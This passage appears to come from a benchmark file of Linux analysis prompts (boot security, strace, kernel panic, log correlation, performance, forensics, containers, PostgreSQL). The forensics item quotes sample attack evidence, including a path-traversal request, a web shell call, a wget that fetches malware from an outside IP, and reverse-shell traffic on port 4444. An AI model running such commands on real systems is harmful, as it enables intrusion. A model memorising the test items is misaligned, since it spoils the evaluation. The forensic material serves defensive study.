      "prompt": "\nBuild a comprehensive boot security analyzer:\n1. Verify secure boot status and certificate chains\n2. Analyze UEFI variables for persistence mechanisms\n3. Check kernel command line for security-relevant parameters\n4. Verify initramfs integrity and contents\n5. Track module loading during boot and verify signatures\n6. Analyze systemd boot performance and security status\n7. Check for firmware vulnerabilities and available updates\n8. Monitor TPM usage and PCR values\n9. Verify dm-verity or dm-integrity usage for root filesystem\n10. Detect boot-time malware indicators\nGenerate a boot security score with specific hardening recommendations.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive boot security analyzer:\n1. Verify secure boot status and certificate chains\n2. Analyze UEFI variables for persistence mechanisms\n3. Check kernel command line for security-relevant parameters\n4. Verify initramfs integrity and contents\n5. Track module loading during boot and verify signatures\n6. Analyze systemd boot performance and security status\n7. Check for firmware vulnerabilities and available updates\n8. Monitor TPM usage and PCR values\n9. Verify dm-verity or dm-integrity usage for root filesystem\n10. Detect boot-time malware indicators\nGenerate a boot security score with specific hardening recommendations.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_46",
      "name": "Test 46: Comprehensive System Trace Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nAnalyze this 8000-line strace output from a complex multi-threaded application experiencing intermittent failures:\n\n[Begin strace output - in production this would be real trace data]\nexecve(\"/usr/bin/app\", [\"app\", \"--daemon\"], 0x7ffe93847840 /* 26 vars */) = 0\nbrk(NULL)                               = 0x560f2a9e2000\narch_prctl(0x3001 /* ARCH_??? */, 0x7ffde3b8c8a0) = -1 EINVAL\nmmap(NULL, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6a0e4aa000\n... [8000 more lines of syscalls including clone(), futex(), epoll_wait(), etc.]\n[End strace output]\n\nAnalyze this trace to:\n1. Map out all threads created and their relationships\n2. Identify all file descriptors opened, their types (files/sockets/pipes), and lifecycle\n3. Find race conditions between threads (especially around shared resources)\n4. Detect any TOCTOU (Time-of-check Time-of-use) vulnerabilities\n5. Map all network connections: when established, data transferred, and how closed\n6. Identify failed system calls and categorize them by type and frequency\n7. Find potential security issues: privilege changes, unsafe file operations, etc.\n8. Create a timeline of significant events with thread correlation\n9. Identify performance bottlenecks: blocking calls, repeated failures, etc.\n10. Generate specific line number references for each finding\nOutput a comprehensive security and performance assessment report.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this 8000-line strace output from a complex multi-threaded application experiencing intermittent failures:\n\n[Begin strace output - in production this would be real trace data]\nexecve(\"/usr/bin/app\", [\"app\", \"--daemon\"], 0x7ffe93847840 /* 26 vars */) = 0\nbrk(NULL)                               = 0x560f2a9e2000\narch_prctl(0x3001 /* ARCH_??? */, 0x7ffde3b8c8a0) = -1 EINVAL\nmmap(NULL, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6a0e4aa000\n... [8000 more lines of syscalls including clone(), futex(), epoll_wait(), etc.]\n[End strace output]\n\nAnalyze this trace to:\n1. Map out all threads created and their relationships\n2. Identify all file descriptors opened, their types (files/sockets/pipes), and lifecycle\n3. Find race conditions between threads (especially around shared resources)\n4. Detect any TOCTOU (Time-of-check Time-of-use) vulnerabilities\n5. Map all network connections: when established, data transferred, and how closed\n6. Identify failed system calls and categorize them by type and frequency\n7. Find potential security issues: privilege changes, unsafe file operations, etc.\n8. Create a timeline of significant events with thread correlation\n9. Identify performance bottlenecks: blocking calls, repeated failures, etc.\n10. Generate specific line number references for each finding\nOutput a comprehensive security and performance assessment report.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_47",
      "name": "Test 47: Kernel Oops/Panic Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nAnalyze this complete kernel panic dump and provide root cause analysis:\n\n[Begin kernel panic dump - in production this would be real panic data]\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000028\nIP: [<ffffffffa0358f61>] my_driver_ioctl+0x41/0x280 [my_driver]\nPGD 1a0b4a067 P4D 1a0b4a067 PUD 1a0b49067 PMD 0\nOops: 0000 [#1] SMP PTI\nCPU: 3 PID: 28239 Comm: test_app Tainted: G           O    4.15.0-200-generic\nHardware name: Dell Inc. PowerEdge R740/08D89F, BIOS 2.12.2 07/09/2021\nRIP: 0010:[<ffffffffa0358f61>]  [<ffffffffa0358f61>] my_driver_ioctl+0x41/0x280\nRSP: 0018:ffffa55a0a3c3d88  EFLAGS: 00010246\nRAX: 0000000000000000 RBX: ffff8f5a7e3a8000 RCX: 0000000000000000\n... [200 more lines of register dumps, stack traces, etc.]\n[End kernel panic dump]\n\nProvide:\n1. Root cause analysis of the crash with specific code path\n2. Identify the tainted flags and their implications\n3. Analyze the stack trace to understand the call chain\n4. Examine register values to understand the failure mode\n5. Check for common vulnerability patterns (null pointer, buffer overflow, etc.)\n6. Identify the module responsible and any version information\n7. Assess system impact and data corruption risks\n8. Provide specific debugging steps to reproduce/fix\n9. Analyze CPU and hardware information for relevance\n10. Generate remediation recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this complete kernel panic dump and provide root cause analysis:\n\n[Begin kernel panic dump - in production this would be real panic data]\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000028\nIP: [<ffffffffa0358f61>] my_driver_ioctl+0x41/0x280 [my_driver]\nPGD 1a0b4a067 P4D 1a0b4a067 PUD 1a0b49067 PMD 0\nOops: 0000 [#1] SMP PTI\nCPU: 3 PID: 28239 Comm: test_app Tainted: G           O    4.15.0-200-generic\nHardware name: Dell Inc. PowerEdge R740/08D89F, BIOS 2.12.2 07/09/2021\nRIP: 0010:[<ffffffffa0358f61>]  [<ffffffffa0358f61>] my_driver_ioctl+0x41/0x280\nRSP: 0018:ffffa55a0a3c3d88  EFLAGS: 00010246\nRAX: 0000000000000000 RBX: ffff8f5a7e3a8000 RCX: 0000000000000000\n... [200 more lines of register dumps, stack traces, etc.]\n[End kernel panic dump]\n\nProvide:\n1. Root cause analysis of the crash with specific code path\n2. Identify the tainted flags and their implications\n3. Analyze the stack trace to understand the call chain\n4. Examine register values to understand the failure mode\n5. Check for common vulnerability patterns (null pointer, buffer overflow, etc.)\n6. Identify the module responsible and any version information\n7. Assess system impact and data corruption risks\n8. Provide specific debugging steps to reproduce/fix\n9. Analyze CPU and hardware information for relevance\n10. Generate remediation recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_48",
      "name": "Test 48: Distributed System Log Correlation",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nAnalyze these logs from a distributed system experiencing cascading failures. Correlate events across 5 services:\n\n[Service A - API Gateway - 2000 lines]\n2024-01-15 10:15:23.456 INFO [req-123] Incoming request from 192.168.1.100\n2024-01-15 10:15:23.458 INFO [req-123] Forwarding to backend service B\n2024-01-15 10:15:28.458 ERROR [req-123] Timeout waiting for service B response\n... [1997 more lines]\n\n[Service B - Application Server - 2500 lines]\n2024-01-15 10:15:23.461 INFO [req-123] Received request from gateway\n2024-01-15 10:15:23.462 INFO [req-123] Querying database service C\n2024-01-15 10:15:25.462 WARN [req-123] Database query slow: 2000ms\n... [2497 more lines]\n\n[Service C - Database - 3000 lines]\n2024-01-15 10:15:23.463 INFO Connection from service B established\n2024-01-15 10:15:23.465 WARN Lock wait timeout on table 'users'\n2024-01-15 10:15:24.465 ERROR Deadlock detected, rolling back transaction\n... [2997 more lines]\n\n[Service D - Cache - 1500 lines]\n2024-01-15 10:15:22.100 INFO Cache memory usage at 95%\n2024-01-15 10:15:23.100 WARN Evicting 10000 entries due to memory pressure\n2024-01-15 10:15:24.100 ERROR Unable to allocate memory for new entries\n... [1497 more lines]\n\n[Service E - Message Queue - 2000 lines]\n2024-01-15 10:15:20.000 INFO Queue depth: 50000 messages\n2024-01-15 10:15:25.000 WARN Consumer lag increasing: 5 minutes behind\n2024-01-15 10:15:30.000 ERROR Queue full, rejecting new messages\n... [1997 more lines]\n\nAnalyze to:\n1. Create a unified timeline of events across all services\n2. Identify the root cause service and initial failure trigger\n3. Map the cascade pattern - how failure propagated\n4. Find critical points where cascade could have been prevented\n5. Identify missing error handling and timeout configurations\n6. Detect resource exhaustion patterns leading to failure\n7. Analyze retry storms and backpressure failures\n8. Find configuration mismatches between services\n9. Generate a service dependency failure map\n10. Provide specific remediation for each service\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze these logs from a distributed system experiencing cascading failures. Correlate events across 5 services:\n\n[Service A - API Gateway - 2000 lines]\n2024-01-15 10:15:23.456 INFO [req-123] Incoming request from 192.168.1.100\n2024-01-15 10:15:23.458 INFO [req-123] Forwarding to backend service B\n2024-01-15 10:15:28.458 ERROR [req-123] Timeout waiting for service B response\n... [1997 more lines]\n\n[Service B - Application Server - 2500 lines]\n2024-01-15 10:15:23.461 INFO [req-123] Received request from gateway\n2024-01-15 10:15:23.462 INFO [req-123] Querying database service C\n2024-01-15 10:15:25.462 WARN [req-123] Database query slow: 2000ms\n... [2497 more lines]\n\n[Service C - Database - 3000 lines]\n2024-01-15 10:15:23.463 INFO Connection from service B established\n2024-01-15 10:15:23.465 WARN Lock wait timeout on table 'users'\n2024-01-15 10:15:24.465 ERROR Deadlock detected, rolling back transaction\n... [2997 more lines]\n\n[Service D - Cache - 1500 lines]\n2024-01-15 10:15:22.100 INFO Cache memory usage at 95%\n2024-01-15 10:15:23.100 WARN Evicting 10000 entries due to memory pressure\n2024-01-15 10:15:24.100 ERROR Unable to allocate memory for new entries\n... [1497 more lines]\n\n[Service E - Message Queue - 2000 lines]\n2024-01-15 10:15:20.000 INFO Queue depth: 50000 messages\n2024-01-15 10:15:25.000 WARN Consumer lag increasing: 5 minutes behind\n2024-01-15 10:15:30.000 ERROR Queue full, rejecting new messages\n... [1997 more lines]\n\nAnalyze to:\n1. Create a unified timeline of events across all services\n2. Identify the root cause service and initial failure trigger\n3. Map the cascade pattern - how failure propagated\n4. Find critical points where cascade could have been prevented\n5. Identify missing error handling and timeout configurations\n6. Detect resource exhaustion patterns leading to failure\n7. Analyze retry storms and backpressure failures\n8. Find configuration mismatches between services\n9. Generate a service dependency failure map\n10. Provide specific remediation for each service\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_49",
      "name": "Test 49: Performance Profile Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nAnalyze this comprehensive system performance profile collected during a production incident:\n\n[CPU Profile - 3000 samples]\n  45.3%  [kernel]  [k] native_queued_spin_lock_slowpath\n  12.1%  mysqld    [.] buf_page_get_gen\n   8.7%  [kernel]  [k] _raw_spin_lock\n   5.2%  app_srv   [.] malloc\n... [2996 more samples]\n\n[Memory Profile - /proc/meminfo snapshots over 1 hour]\nTime: 00:00 MemTotal: 128GB MemFree: 2GB Cached: 40GB SwapTotal: 8GB SwapFree: 0GB\nTime: 00:05 MemTotal: 128GB MemFree: 1GB Cached: 20GB SwapTotal: 8GB SwapFree: 0GB\n... [100 more snapshots]\n\n[I/O Profile - iostat data]\nDevice    r/s     w/s     rkB/s   wkB/s   await  r_await  w_await  %util\nsda     2341.00  156.00  93640.0  2496.0  145.3   142.1    193.2   99.8\n... [500 more lines]\n\n[Network Profile - ss statistics]\nState  Recv-Q  Send-Q  Local:Port  Peer:Port\nESTAB  0       2043520 10.0.0.5:80 10.0.0.100:45123\n... [1000 more connections]\n\n[Application Metrics]\nrequest_latency_p99: 5000ms -> 30000ms (degradation over 1 hour)\nerror_rate: 0.1% -> 45% \nactive_connections: 1000 -> 25000\n... [200 more metrics]\n\nAnalyze to:\n1. Identify the primary bottleneck (CPU/Memory/I/O/Network)\n2. Correlate kernel spinlock contention with application behavior\n3. Analyze memory pressure and its impact on performance\n4. Identify I/O patterns suggesting thrashing or poor access patterns\n5. Find network congestion or connection exhaustion issues\n6. Map performance degradation timeline with specific triggers\n7. Identify feedback loops making the problem worse\n8. Find tuning parameters that could alleviate issues\n9. Detect signs of resource starvation or priority inversion\n10. Generate specific optimization recommendations with expected impact\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this comprehensive system performance profile collected during a production incident:\n\n[CPU Profile - 3000 samples]\n  45.3%  [kernel]  [k] native_queued_spin_lock_slowpath\n  12.1%  mysqld    [.] buf_page_get_gen\n   8.7%  [kernel]  [k] _raw_spin_lock\n   5.2%  app_srv   [.] malloc\n... [2996 more samples]\n\n[Memory Profile - /proc/meminfo snapshots over 1 hour]\nTime: 00:00 MemTotal: 128GB MemFree: 2GB Cached: 40GB SwapTotal: 8GB SwapFree: 0GB\nTime: 00:05 MemTotal: 128GB MemFree: 1GB Cached: 20GB SwapTotal: 8GB SwapFree: 0GB\n... [100 more snapshots]\n\n[I/O Profile - iostat data]\nDevice    r/s     w/s     rkB/s   wkB/s   await  r_await  w_await  %util\nsda     2341.00  156.00  93640.0  2496.0  145.3   142.1    193.2   99.8\n... [500 more lines]\n\n[Network Profile - ss statistics]\nState  Recv-Q  Send-Q  Local:Port  Peer:Port\nESTAB  0       2043520 10.0.0.5:80 10.0.0.100:45123\n... [1000 more connections]\n\n[Application Metrics]\nrequest_latency_p99: 5000ms -> 30000ms (degradation over 1 hour)\nerror_rate: 0.1% -> 45% \nactive_connections: 1000 -> 25000\n... [200 more metrics]\n\nAnalyze to:\n1. Identify the primary bottleneck (CPU/Memory/I/O/Network)\n2. Correlate kernel spinlock contention with application behavior\n3. Analyze memory pressure and its impact on performance\n4. Identify I/O patterns suggesting thrashing or poor access patterns\n5. Find network congestion or connection exhaustion issues\n6. Map performance degradation timeline with specific triggers\n7. Identify feedback loops making the problem worse\n8. Find tuning parameters that could alleviate issues\n9. Detect signs of resource starvation or priority inversion\n10. Generate specific optimization recommendations with expected impact\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_50",
      "name": "Test 50: Security Incident Forensics",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_security",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux security",
      "prompt": "\nAnalyze this comprehensive security incident data to reconstruct the attack:\n\n[Auth Logs - 5000 lines]\nJan 15 02:15:23 server sshd[12345]: Failed password for invalid user admin from 185.234.218.15\nJan 15 02:15:25 server sshd[12346]: Failed password for invalid user root from 185.234.218.15\n... [4998 more lines showing various auth attempts, some successful]\n\n[Apache Access Logs - 8000 lines]\n185.234.218.15 - - [15/Jan/2024:02:30:15] \"GET /admin/../../../../../etc/passwd HTTP/1.1\" 404\n185.234.218.15 - - [15/Jan/2024:02:30:16] \"POST /upload.php HTTP/1.1\" 200\n192.168.1.100 - - [15/Jan/2024:02:30:45] \"GET /shell.php?cmd=whoami HTTP/1.1\" 200\n... [7997 more lines]\n\n[System Call Audit Logs - 10000 events]\ntype=SYSCALL msg=audit(1705289415.234:9876): arch=x86_64 syscall=execve success=yes exe=\"/tmp/.hidden\"\ntype=SYSCALL msg=audit(1705289420.123:9877): arch=x86_64 syscall=connect success=yes addr=185.234.218.15:4444\n... [9998 more events]\n\n[File Integrity Monitoring - 2000 changes]\n[02:31:00] ADDED: /tmp/.hidden (755 root:root) SHA256:a1b2c3d4...\n[02:31:05] MODIFIED: /etc/crontab SHA256:before:x1y2z3... after:p9q8r7...\n[02:31:10] ADDED: /var/www/html/shell.php (644 www-data:www-data)\n... [1997 more changes]\n\n[Network Flows - 3000 connections]\n02:30:00 TCP 192.168.1.100:39284 -> 185.234.218.15:4444 Established 5MB sent\n02:31:00 TCP 192.168.1.100:39285 -> 185.234.218.15:443 Established 50MB sent\n... [2998 more flows]\n\n[Process Tree Snapshot at incident time]\n\\_ /usr/sbin/apache2\n   \\_ /bin/sh -c cd /tmp && wget http://185.234.218.15/malware\n   \\_ /tmp/.hidden\n      \\_ /bin/bash -i\n         \\_ python -c import pty;pty.spawn(\"/bin/bash\")\n... [Full process tree with 500 processes]\n\nAnalyze to:\n1. Reconstruct the complete attack timeline with phases\n2. Identify initial compromise vector and exploit used\n3. Track lateral movement and privilege escalation steps\n4. Find all persistence mechanisms established\n5. Identify data exfiltration: what, how much, where to\n6. Map all compromised accounts and systems\n7. Find IOCs (Indicators of Compromise) for threat hunting\n8. Assess the sophistication level and likely threat actor\n9. Identify security control failures that enabled the attack\n10. Generate immediate containment and long-term remediation plans\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this comprehensive security incident data to reconstruct the attack:\n\n[Auth Logs - 5000 lines]\nJan 15 02:15:23 server sshd[12345]: Failed password for invalid user admin from 185.234.218.15\nJan 15 02:15:25 server sshd[12346]: Failed password for invalid user root from 185.234.218.15\n... [4998 more lines showing various auth attempts, some successful]\n\n[Apache Access Logs - 8000 lines]\n185.234.218.15 - - [15/Jan/2024:02:30:15] \"GET /admin/../../../../../etc/passwd HTTP/1.1\" 404\n185.234.218.15 - - [15/Jan/2024:02:30:16] \"POST /upload.php HTTP/1.1\" 200\n192.168.1.100 - - [15/Jan/2024:02:30:45] \"GET /shell.php?cmd=whoami HTTP/1.1\" 200\n... [7997 more lines]\n\n[System Call Audit Logs - 10000 events]\ntype=SYSCALL msg=audit(1705289415.234:9876): arch=x86_64 syscall=execve success=yes exe=\"/tmp/.hidden\"\ntype=SYSCALL msg=audit(1705289420.123:9877): arch=x86_64 syscall=connect success=yes addr=185.234.218.15:4444\n... [9998 more events]\n\n[File Integrity Monitoring - 2000 changes]\n[02:31:00] ADDED: /tmp/.hidden (755 root:root) SHA256:a1b2c3d4...\n[02:31:05] MODIFIED: /etc/crontab SHA256:before:x1y2z3... after:p9q8r7...\n[02:31:10] ADDED: /var/www/html/shell.php (644 www-data:www-data)\n... [1997 more changes]\n\n[Network Flows - 3000 connections]\n02:30:00 TCP 192.168.1.100:39284 -> 185.234.218.15:4444 Established 5MB sent\n02:31:00 TCP 192.168.1.100:39285 -> 185.234.218.15:443 Established 50MB sent\n... [2998 more flows]\n\n[Process Tree Snapshot at incident time]\n\\_ /usr/sbin/apache2\n   \\_ /bin/sh -c cd /tmp && wget http://185.234.218.15/malware\n   \\_ /tmp/.hidden\n      \\_ /bin/bash -i\n         \\_ python -c import pty;pty.spawn(\"/bin/bash\")\n... [Full process tree with 500 processes]\n\nAnalyze to:\n1. Reconstruct the complete attack timeline with phases\n2. Identify initial compromise vector and exploit used\n3. Track lateral movement and privilege escalation steps\n4. Find all persistence mechanisms established\n5. Identify data exfiltration: what, how much, where to\n6. Map all compromised accounts and systems\n7. Find IOCs (Indicators of Compromise) for threat hunting\n8. Assess the sophistication level and likely threat actor\n9. Identify security control failures that enabled the attack\n10. Generate immediate containment and long-term remediation plans\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_51",
      "name": "Test 51: Container Runtime Deep Inspection",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_containers",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux containers",
      "prompt": "\nAnalyze this detailed container runtime state for security and performance issues:\n\n[Docker Daemon State - 2000 lines]\nContainers: 487 (Running: 423, Paused: 2, Stopped: 62)\nImages: 1847\nServer Version: 20.10.23\nStorage Driver: overlay2\n Backing Filesystem: xfs\n Supports d_type: true\n Native Overlay Diff: true\n... [1994 more configuration lines]\n\n[Container Inspect Output - 50 containers x 200 lines each]\nContainer: web-frontend-7d4b8c\n{\n  \"State\": {\n    \"Status\": \"running\",\n    \"Pid\": 28456,\n    \"OOMKilled\": true,\n    \"RestartCount\": 47,\n    \"StartedAt\": \"2024-01-15T10:00:00Z\"\n  },\n  \"HostConfig\": {\n    \"Privileged\": true,\n    \"Capabilities\": [\"SYS_ADMIN\", \"NET_ADMIN\"],\n    \"SecurityOpt\": [\"apparmor=unconfined\"],\n    \"Memory\": 0,\n    \"CpuShares\": 2\n  },\n  \"Mounts\": [\n    {\"Type\": \"bind\", \"Source\": \"/\", \"Destination\": \"/host\", \"RW\": true}\n  ]\n}\n... [49 more containers]\n\n[cgroup Statistics - 5000 lines]\n/docker/7d4b8c.../memory.current: 8589934592\n/docker/7d4b8c.../memory.events: oom_kill 47\n/docker/7d4b8c.../cpu.stat: throttled_time 3847298374923\n... [4997 more lines]\n\n[Network Namespace Analysis - 3000 lines]\nnsenter -t 28456 -n ss -tuln\nState  Local Address:Port  Process\nLISTEN 0.0.0.0:22         sshd\nLISTEN 0.0.0.0:8080       java\n... [2998 more lines]\n\n[seccomp Profile Analysis - 1000 lines]\nContainer: web-frontend-7d4b8c\nSeccomp: disabled\n---\nContainer: api-backend-9f3a2e  \nSeccomp: custom\nAllowed: [read, write, open, close, stat, fstat, mmap, ...]\nBlocked: [ptrace, mount, ...]\n... [998 more profile lines]\n\nAnalyze to:\n1. Identify containers with dangerous security configurations\n2. Find resource limit misconfigurations causing instability\n3. Detect container escape risks (privileged, cap_sys_admin, etc.)\n4. Analyze OOM patterns and memory leak indicators\n5. Find CPU throttling impact on application performance\n6. Identify network exposure risks (0.0.0.0 bindings)\n7. Assess image vulnerabilities and update priorities\n8. Detect crypto-mining or malicious container indicators\n9. Find performance bottlenecks from cgroup statistics\n10. Generate hardening recommendations for each container\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this detailed container runtime state for security and performance issues:\n\n[Docker Daemon State - 2000 lines]\nContainers: 487 (Running: 423, Paused: 2, Stopped: 62)\nImages: 1847\nServer Version: 20.10.23\nStorage Driver: overlay2\n Backing Filesystem: xfs\n Supports d_type: true\n Native Overlay Diff: true\n... [1994 more configuration lines]\n\n[Container Inspect Output - 50 containers x 200 lines each]\nContainer: web-frontend-7d4b8c\n{\n  \"State\": {\n    \"Status\": \"running\",\n    \"Pid\": 28456,\n    \"OOMKilled\": true,\n    \"RestartCount\": 47,\n    \"StartedAt\": \"2024-01-15T10:00:00Z\"\n  },\n  \"HostConfig\": {\n    \"Privileged\": true,\n    \"Capabilities\": [\"SYS_ADMIN\", \"NET_ADMIN\"],\n    \"SecurityOpt\": [\"apparmor=unconfined\"],\n    \"Memory\": 0,\n    \"CpuShares\": 2\n  },\n  \"Mounts\": [\n    {\"Type\": \"bind\", \"Source\": \"/\", \"Destination\": \"/host\", \"RW\": true}\n  ]\n}\n... [49 more containers]\n\n[cgroup Statistics - 5000 lines]\n/docker/7d4b8c.../memory.current: 8589934592\n/docker/7d4b8c.../memory.events: oom_kill 47\n/docker/7d4b8c.../cpu.stat: throttled_time 3847298374923\n... [4997 more lines]\n\n[Network Namespace Analysis - 3000 lines]\nnsenter -t 28456 -n ss -tuln\nState  Local Address:Port  Process\nLISTEN 0.0.0.0:22         sshd\nLISTEN 0.0.0.0:8080       java\n... [2998 more lines]\n\n[seccomp Profile Analysis - 1000 lines]\nContainer: web-frontend-7d4b8c\nSeccomp: disabled\n---\nContainer: api-backend-9f3a2e  \nSeccomp: custom\nAllowed: [read, write, open, close, stat, fstat, mmap, ...]\nBlocked: [ptrace, mount, ...]\n... [998 more profile lines]\n\nAnalyze to:\n1. Identify containers with dangerous security configurations\n2. Find resource limit misconfigurations causing instability\n3. Detect container escape risks (privileged, cap_sys_admin, etc.)\n4. Analyze OOM patterns and memory leak indicators\n5. Find CPU throttling impact on application performance\n6. Identify network exposure risks (0.0.0.0 bindings)\n7. Assess image vulnerabilities and update priorities\n8. Detect crypto-mining or malicious container indicators\n9. Find performance bottlenecks from cgroup statistics\n10. Generate hardening recommendations for each container\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_52",
      "name": "Test 52: Database Query Performance Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nAnalyze this PostgreSQL slow query log and system state during a performance crisis:\n\n[Slow Query Log - 5000 queries]\n2024-01-15 10:00:00 UTC [28456]: [1-1] user=app_user,db=production LOG: duration: 45234.123 ms\n  statement: SELECT u.*, o.*, p.* FROM users u \n  LEFT JOIN orders o ON u.id = o.user_id \n  LEFT JOIN products p ON o.product_id = p.id \n  WHERE u.created_at > '2023-01-01' \n  AND NOT EXISTS (\n    SELECT 1 FROM user_sessions us WHERE us.user_id = u.id\n  )\n  ORDER BY u.id, o.created_at DESC;\n\n2024-01-15 10:00:45 UTC [28457]: [1-1] user=app_user,db=production LOG: duration: 67890.456 ms\n  statement: WITH RECURSIVE category_tree AS (\n    SELECT id, parent_id, name, 0 as level \n    FROM categories WHERE parent_id IS NULL\n    UNION ALL\n    SELECT c.id, c.parent_id, c.name, ct.level + 1\n    FROM categories c \n    INNER JOIN category_tree ct ON c.parent_id = ct.id\n  )\n  SELECT * FROM category_tree ORDER BY level, name;\n... [4998 more queries]\n\n[pg_stat_statements - Top 100 queries by total time]\nquery                                    | calls  | total_time   | mean_time | stddev_time\n-----------------------------------------+--------+--------------+-----------+-------------\nSELECT * FROM large_table WHERE $1       | 584921 | 8493829.23  | 14.52     | 234.5\nUPDATE users SET last_seen = $1 WHERE $2 | 923847 | 7234234.45  | 7.83      | 12.3\n... [98 more entries]\n\n[Table Statistics - 500 tables]\nschemaname | tablename       | n_live_tup | n_dead_tup | last_vacuum         | last_analyze\n-----------+-----------------+------------+------------+---------------------+------------------\npublic     | users           | 45839204   | 23492834   | 2024-01-01 00:00:00 | 2023-12-01 00:00:00\npublic     | orders          | 928374923  | 82934782   | NULL                | 2023-06-01 00:00:00\n... [498 more tables]\n\n[Index Usage Statistics - 1000 indexes]\nschemaname | tablename | indexname              | idx_scan | idx_tup_read | idx_tup_fetch | idx_blks_hit\n-----------+-----------+------------------------+----------+--------------+---------------+--------------\npublic     | users     | users_pkey            | 9283847  | 9283847      | 9283847       | 2834782\npublic     | users     | idx_users_created_at  | 0        | 0            | 0             | 0\n... [998 more indexes]\n\n[Lock Analysis - Current locks]\npid   | relation     | mode                | granted | wait_start\n------+--------------+---------------------+---------+------------------------\n28456 | users        | AccessShareLock     | t       | \n28457 | users        | AccessExclusiveLock | f       | 2024-01-15 10:05:00\n... [200 more lock entries]\n\n[System Metrics During Incident]\nTime   | CPU% | IOWait% | MemoryUsed | SwapUsed | ReadMB/s | WriteMB/s\n-------+------+---------+------------+----------+----------+-----------\n10:00  | 95   | 45      | 98%        | 75%      | 2400     | 100\n10:01 